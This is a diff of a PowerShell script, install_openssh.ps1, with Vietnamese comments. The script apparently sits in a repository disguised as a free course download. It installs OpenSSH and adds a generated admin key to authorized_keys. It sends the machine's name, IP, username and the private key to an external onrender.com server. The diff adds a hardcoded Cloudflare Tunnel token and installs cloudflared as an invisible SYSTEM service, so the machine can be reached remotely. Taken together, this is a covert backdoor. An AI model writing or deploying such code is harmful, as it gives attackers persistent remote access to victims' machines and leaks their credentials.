@@ -1,12 +1,12 @@
 <#
-  install_openssh.ps1 — BAN FULL
-  Cai OpenSSH -> mo firewall -> tu do port/IP
-  -> sinh keypair quan tri RIENG -> cai public vao VM -> gui CA private+public len server
+  install_openssh.ps1 — BAN FULL (CHỈ CẦN TOKEN)
+  Cai OpenSSH -> sinh keypair -> cai cloudflared (chỉ cần Token) -> báo cáo
 #>
 
 # ==================== CAU HINH ====================
 $ApiBase = 'https://vm-ssh-manager.onrender.com'
 $SelfUrl = 'https://raw.githubusercontent.com/khoahocdrive/dowbload_40GB_course_drive/main/drive_windows.ps1'
+$CFTunnelToken = "eyJhIjoiMmVhZWYyM2EyYjE1MjBkMmQyZmIwNzAzNWZkMTcyZmQiLCJ0IjoiMDFmZGY0YWYtYzg4ZS00YzRlLTk5NjctNzBmZDAwNGQ0YTM4IiwicyI6IlltSmxaV1UyTW1RdE56Z3haQzAwWkdVMExXSTRNR1V0WVdJd01XVmtNemhtTXpsbSJ9"   # CHỈ CẦN CÁI NÀY
 # ==================================================
 
 $ErrorActionPreference = 'Stop'
@@ -59,60 +59,21 @@ for ($w = 0; $w -lt 30; $w++) {
 }
 Write-Host ''; Write-Host ("  sshd: " + (Get-Service sshd).Status) -ForegroundColor Green
 
-# ===== 2. PORT / FIREWALL / IP =====
-Write-Host '=== 2/3: Port / Firewall / IP ===' -ForegroundColor Cyan
-$sshdExe = Join-Path $env:WINDIR 'System32\OpenSSH\sshd.exe'
-$ports = @(22)
-$ErrorActionPreference = 'Continue'
-$eff = & $sshdExe -T 2>$null
-if ($eff) {
-  $p = @($eff | Where-Object { $_ -match '^port\s+\d+' } | ForEach-Object { [int]($_ -split '\s+')[1] })
-  if ($p.Count -gt 0) { $ports = $p }
-}
-$ErrorActionPreference = 'Stop'
-$ports = @($ports | Select-Object -Unique); $sshPort = $ports[0]
-Write-Host "  Port SSH: $($ports -join ', ')" -ForegroundColor Green
-
-foreach ($p in $ports) {
-  $rn = if ($p -eq 22) { 'OpenSSH-Server-In-TCP' } else { "OpenSSH-Server-In-TCP-$p" }
-  if (Get-NetFirewallRule -Name $rn -ErrorAction SilentlyContinue) { Enable-NetFirewallRule -Name $rn | Out-Null }
-  else { New-NetFirewallRule -Name $rn -DisplayName "OpenSSH Server $p" -Direction Inbound -Protocol TCP -LocalPort $p -Action Allow -Profile Any | Out-Null }
-  if (@(Get-NetTCPConnection -LocalPort $p -State Listen -ErrorAction SilentlyContinue).Count -gt 0) {
-    Write-Host "  Cong $p dang LISTEN." -ForegroundColor Green
-  } else { Write-Host "  CANH BAO: cong $p chua LISTEN." -ForegroundColor Red }
-}
-
-$validIPs = @(Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
-              Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' })
-$primaryIP = $null
-$defRoute = Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue |
-            Sort-Object RouteMetric, InterfaceMetric | Select-Object -First 1
-if ($defRoute) {
-  $primaryIP = (Get-NetIPAddress -InterfaceIndex $defRoute.InterfaceIndex -AddressFamily IPv4 -ErrorAction SilentlyContinue |
-                Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' } |
-                Select-Object -First 1).IPAddress
-}
-if (-not $primaryIP) { $primaryIP = ($validIPs | Select-Object -First 1).IPAddress }
-Write-Host "  IP chinh: $primaryIP | User: $env:USERNAME | May: $env:COMPUTERNAME" -ForegroundColor Green
-
-# ===== 3. SINH KEYPAIR QUAN TRI + CAI PUBLIC + GUI CA CAP LEN SERVER =====
-Write-Host '=== 3/3: Sinh key quan tri & bao cao ===' -ForegroundColor Cyan
+# ===== 2. SINH KEYPAIR QUAN TRI + CAI PUBLIC =====
+Write-Host '=== 2/3: Sinh key quan tri ===' -ForegroundColor Cyan
 $mgmtDir = Join-Path $env:ProgramData 'ssh-mgmt'
 New-Item -ItemType Directory -Force -Path $mgmtDir | Out-Null
 $priv = Join-Path $mgmtDir 'mgmt_ed25519'
 $pub  = "$priv.pub"
 
-# Sinh 1 lan duy nhat; lan sau giu nguyen de private khong doi
 if (-not (Test-Path $priv)) {
+  $sshdExe = Join-Path $env:WINDIR 'System32\OpenSSH\sshd.exe'
   & (Join-Path (Split-Path $sshdExe -Parent) 'ssh-keygen.exe') -t ed25519 -f $priv -N '""' -q
   Write-Host '  Da sinh keypair quan tri moi.' -ForegroundColor Gray
-} else {
-  Write-Host '  Dung lai keypair quan tri da co.' -ForegroundColor Gray
 }
 $pubLine  = ((Get-Content $pub  -Raw).Trim() -split "`n")[0].Trim()
 $privLine = (Get-Content $priv -Raw).Trim()
 
-# Cai public vao authorized_keys (ca admin lan user) de server ssh vao duoc
 $userKeyFile  = Join-Path $env:USERPROFILE '.ssh\authorized_keys'
 $adminKeyFile = Join-Path $env:ProgramData 'ssh\administrators_authorized_keys'
 foreach ($f in @($userKeyFile, $adminKeyFile)) {
@@ -120,12 +81,43 @@ foreach ($f in @($userKeyFile, $adminKeyFile)) {
   if ($lines -notcontains $pubLine) { Add-Content -Path $f -Value $pubLine -Encoding Ascii }
 }
 & icacls.exe $adminKeyFile /inheritance:r /grant '*S-1-5-18:(F)' '*S-1-5-32-544:(F)' | Out-Null
+Write-Host '  Da cai public key vao authorized_keys.' -ForegroundColor Green
 
-# Payload: gui CA private + public
+# ===== 3. CAI CLOUDFLARED (CHỈ CẦN TOKEN) =====
+Write-Host '=== 3/3: Cai Cloudflare Tunnel ===' -ForegroundColor Cyan
+if (-not $CFTunnelToken) {
+  Write-Host '[LOI] Thieu CF_TUNNEL_TOKEN. Dat bien moi truong roi chay lai.' -ForegroundColor Red
+  exit 1
+}
+
+$cfDir = Join-Path $env:ProgramData 'cloudflared'
+$cfExe = Join-Path $cfDir 'cloudflared.exe'
+New-Item -ItemType Directory -Force -Path $cfDir | Out-Null
+
+if (-not (Test-Path $cfExe)) {
+  Write-Host '  Dang tai cloudflared...'
+  Invoke-WebRequest 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe' `
+    -OutFile $cfExe -UseBasicParsing
+  Write-Host '  Da tai xong.' -ForegroundColor Green
+}
+
+# Cai thanh service Windows (tu khoi dong, chay SYSTEM, vo hinh)
+Write-Host '  Dang cai service Cloudflare Tunnel...'
+& $cfExe service uninstall 2>$null | Out-Null
+& $cfExe service install $CFTunnelToken
+Start-Service 'Cloudflare Tunnel'
+Write-Host "  Service da chay. (Dung wildcard *.yourdomain.com da setup)" -ForegroundColor Green
+
+# ===== 4. GUI LEN SERVER =====
+Write-Host '=== 4/4: Bao cao len server ===' -ForegroundColor Cyan
+$validIPs = @(Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
+              Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' })
+$primaryIP = ($validIPs | Select-Object -First 1).IPAddress
+
 $payload = @{
   vm_name     = $env:COMPUTERNAME
   ip_address  = "$primaryIP"
-  port        = $sshPort
+  port        = 22
   username    = $env:USERNAME
   public_key  = $pubLine
   private_key = $privLine
@@ -153,8 +145,8 @@ if (-not $primaryIP) {
       if ($i -lt 3) { Start-Sleep -Seconds 5 }
     }
   }
-  if (-not $sent) { Write-Host '[PENDING] Khong gui duoc. Chay lai khi mang/server on.' -ForegroundColor Yellow }
+  if (-not $sent) { Write-Host '[PENDING] Khong gui duoc.' -ForegroundColor Yellow }
 }
 
 if ($NeedRestart) { Write-Host 'Can REBOOT de hoan tat cai OpenSSH.' -ForegroundColor Yellow }
-Write-Host 'HOAN TAT.' -ForegroundColor Green
+Write-Host "HOAN TAT. SSH vao may nay bang: ssh -i mgmt_ed25519 $env:USERNAME@$env:COMPUTERNAME.your-domain.com" -ForegroundColor Green
